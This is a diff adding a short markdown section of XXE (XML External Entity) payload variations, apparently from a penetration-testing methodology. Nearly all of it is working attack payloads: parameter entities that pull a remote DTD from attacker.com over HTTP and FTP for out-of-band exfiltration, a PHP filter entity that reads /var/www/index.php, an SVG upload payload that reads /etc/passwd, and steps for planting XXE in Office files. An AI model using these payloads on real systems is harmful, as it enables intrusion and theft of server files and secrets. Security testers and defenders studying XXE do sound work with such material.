@@ -1,0 +1,30 @@
+**Phase 3: XXE Payload Variations**
+- **Parameter Entities** (for blind/OOB):
+  ```xml
+  <!DOCTYPE test [
+    <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
+    %remote;
+  ]>
+  ```
+- **External DTD with FTP** (bypass HTTP restrictions):
+  ```xml
+  <!DOCTYPE test [
+    <!ENTITY % xxe SYSTEM "ftp://attacker.com/xxe.dtd">
+    %xxe;
+  ]>
+  ```
+- **PHP Filter Chains** (for source code read):
+  ```xml
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/index.php">
+  ```
+- **SVG XXE** (image upload):
+  ```xml
+  <svg xmlns="http://www.w3.org/2000/svg">
+    <!DOCTYPE test [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <text>&xxe;</text>
+  </svg>
+  ```
+- **Office Document XXE** (docx, xlsx, pptx):
+  - Unzip → modify `[Content_Types].xml` or `word/document.xml` → rezip
